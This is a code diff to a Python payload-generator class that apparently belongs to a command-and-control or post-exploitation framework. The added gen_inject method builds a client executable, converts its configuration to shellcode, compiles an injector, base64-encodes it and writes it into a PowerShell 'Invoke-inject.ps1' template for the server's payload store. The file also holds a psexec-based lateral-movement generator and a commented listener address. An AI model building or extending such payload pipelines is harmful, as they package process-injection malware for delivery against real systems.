@@ -21,6 +21,7 @@ class mypayloadgen():
         self.__to_template = "Client\\payload\\template\\"
         self.__payload_pstemplate = "Invoke-myclient.ps1"
         self.__psexec_pstemplate = "Invoke-psexec.ps1"
+        self.__inject_pstemplate = "Invoke-inject.ps1"
 
         self.__parentdir = os.path.dirname(os.getcwd())
         self.__payload_tag = r"%%PAYLOAD%%"
@@ -29,11 +30,13 @@ class mypayloadgen():
         self.__to_psdb = "Server\\PSDB\\"
         self.__payload_outputname = "Invoke-myclient.ps1"
         self.__psexec_outputname = "Invoke-psexec.ps1"
+        self.__inject_outputname = "Invoke-inject.ps1"
 
         self.__compress_file_tag = r"%%filename%%"
         self.__compress_template = "Invoke-Compression.ps1"
         self.__compress_topayload = "payload\\myclient.exe"
         self.__compress_topsexec = "tools\\csexec.exe"
+        self.__compress_toinject = "tools\\Inject.exe"
         self.__compress_outputname = "Invoke-Compression.ps1"
 
         self.__mystd = subprocess.DEVNULL
@@ -69,6 +72,35 @@ class mypayloadgen():
     def gen_exe(self):
         mycwd = os.path.join(self.__parentdir,self.__to_client)
         subprocess.run(["build.bat"], shell=True, cwd=mycwd,stdout=self.__mystd)
+
+
+    def gen_inject(self):
+        mycwd = os.path.join(self.__parentdir,self.__to_client)
+        #regen exe first
+        subprocess.run(["build.bat"], shell=True, cwd=mycwd,stdout=self.__mystd)
+
+        #pre-compile config
+        subprocess.run(["conf-inject.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #to shellcode
+        subprocess.run(["inject.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #buid
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__compress_template),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_tools,self.__compress_template),mode='w') as f:
+            f.write(all_of_it.replace(self.__compress_file_tag,self.__compress_toinject))
+
+        output = subprocess.run(["psgen.bat"], capture_output=True, shell=True, cwd=mycwd)
+        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__inject_pstemplate),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_tools,self.__inject_outputname),mode='w') as f:
+            f.write(all_of_it.replace(self.__payload_tag,myb64))
+        
+        with open(os.path.join(self.__parentdir,self.__to_psdb,self.__inject_outputname),mode='w') as f:
+            f.write(all_of_it.replace(self.__payload_tag,myb64))
+
 
     def gen_psexec(self): #this will jump using current payload config, windows\temp need to be accessable
         
@@ -143,6 +175,6 @@ class mypayloadgen():
 if __name__ == "__main__":
     t_mypayloadgen = mypayloadgen()
     #t_mypayloadgen.set_config("socket",False,"127.0.0.1",4444)
-    t_mypayloadgen.gen_psexec()
+    t_mypayloadgen.gen_inject()
 
 
